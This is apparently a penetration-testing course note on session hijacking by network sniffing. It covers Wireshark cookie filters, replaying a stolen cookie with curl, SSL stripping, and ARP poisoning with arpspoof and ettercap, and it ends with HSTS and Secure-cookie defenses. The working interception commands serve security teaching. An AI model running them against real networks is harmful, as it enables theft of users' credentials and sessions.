---
tags: [vapt, session-management, network, intermediate]
difficulty: intermediate
module: "17 - Session Management"
topic: "17.05 Session Hijacking via Network Sniffing"
---

# 17.05 — Session Hijacking via Network Sniffing

## How Network-Based Session Theft Works

```
ON HTTP (unencrypted):
  All traffic is plaintext!
  Anyone on the same network can see:
  - Login credentials
  - Session cookies in Cookie: headers
  - All request/response content
  
  Network positions that can sniff:
  - Same LAN/WiFi (especially open WiFi!)
  - ISP (your traffic passes through them)
  - Compromised router/gateway
  - Man-in-the-middle between client and server
  
ON HTTPS (encrypted):
  Content is encrypted → sniffer can't see cookie values
  BUT: If HTTPS is not enforced → attacker can downgrade!
  SSL Stripping: MITM converts HTTPS to HTTP → user doesn't notice
  → Now attacker can see plaintext!
```

---

## Wireshark: Capturing Cookies on HTTP

```bash
# CAPTURE HTTP TRAFFIC WITH WIRESHARK:
# Start Wireshark → select interface (eth0, wlan0)
# Filter: http.cookie
# → Shows all HTTP requests with Cookie header

# OR: CAPTURE SPECIFIC SITE:
# Filter: http.host == "target.com" && http.cookie

# LOOK FOR:
Cookie: session=SECRET_VALUE_HERE
# Or:
Cookie: PHPSESSID=abc123; auth_token=xyz789

# EXPORT FOUND COOKIES:
# Right-click → Follow → HTTP Stream → find Cookie: header

# ONCE YOU HAVE THE SESSION:
curl https://target.com/account \
  -H "Cookie: session=SECRET_VALUE_HERE"
```

---

## SSL Stripping Attack

```
SSL STRIPPING (Moxie Marlinspike, 2009):
  
  NORMAL HTTPS:
  User → HTTPS → Server (encrypted, secure)
  
  SSL STRIPPING (MITM):
  User → HTTP → Attacker → HTTPS → Server
         ↑ unencrypted!
  
  User types https://bank.com → BUT:
  If there's no HSTS, user might accept HTTP
  Attacker in the middle:
  → Forwards user's requests via HTTPS to real server
  → Receives HTTPS responses
  → Strips TLS → sends plain HTTP to user
  → User's browser sees HTTP (no padlock) — often doesn't notice!
  
TOOL: sslstrip (ethical use on authorized networks):
  arpspoof -i eth0 -t victim_ip gateway_ip  # ARP poison
  sslstrip -l 8080                            # strip SSL on port 8080
  iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
  # → All HTTP traffic → sslstrip → you see plaintext + cookies!
```

---

## HSTS Bypass Considerations

```
HTTP STRICT TRANSPORT SECURITY (HSTS):
  Response header: Strict-Transport-Security: max-age=31536000
  Browser remembers: "always use HTTPS for this site"
  → SSL stripping fails because browser sends HTTPS directly!
  
BUT: First visit only if no HSTS preload!
  If user has NEVER visited the site → no HSTS cached → SSL strip works!
  
HSTS PRELOAD:
  Browser ships with list of always-HTTPS sites
  → Even first visit is protected
  → Most major sites on preload list
  
TESTING HSTS:
  curl -I https://target.com | grep -i strict
  → Check if Strict-Transport-Security header present
  → Check includeSubDomains; preload for stronger protection
  
MISSING HSTS = FINDING:
  "Missing or weak HSTS header"
  → Recommendation: add max-age=63072000; includeSubDomains; preload
```

---

## ARP Poisoning for Local Network MITM

```bash
# ON AUTHORIZED NETWORK TEST ONLY!

# ENABLE IP FORWARDING (so traffic passes through attacker):
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP SPOOF (tell victim: gateway IP = my MAC, tell gateway: victim IP = my MAC):
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1  # victim → attacker
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100  # gateway → attacker

# CAPTURE TRAFFIC:
tcpdump -i eth0 -w capture.pcap 'host 192.168.1.100'

# OR WIRESHARK LIVE:
wireshark &

# ETTERCAP (all-in-one):
ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1//
# Captures credentials in real-time!

# NOTE: This is an ACTIVE attack, leaves logs, disrupts network
# ONLY on explicitly authorized penetration tests
```

---

## Fix

```
DEFENSES:
  ✓ HTTPS everywhere (no HTTP fallback):
    Redirect all HTTP to HTTPS
    
  ✓ HSTS header:
    Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
    
  ✓ Submit to HSTS Preload list (hstspreload.org):
    → Browser never allows HTTP, even on first visit
    
  ✓ Secure flag on session cookie:
    Set-Cookie: session=X; Secure
    → Cookie ONLY sent over HTTPS connections
    → If HTTP request made → cookie not included
    
  ✓ Certificate Transparency + HPKP (advanced):
    Prevent fraudulent certs from MITM
```

---

## Related Notes
- [[04 - Session Hijacking via Cookie Theft XSS]] — XSS-based theft
- [[11 - Cookie Flags Attack Scenarios]] — Secure flag on cookies
- [[15 - Defense Secure Session Configuration]] — full hardening
- [[Module 03 - HTTP Headers]] — HSTS header deep dive
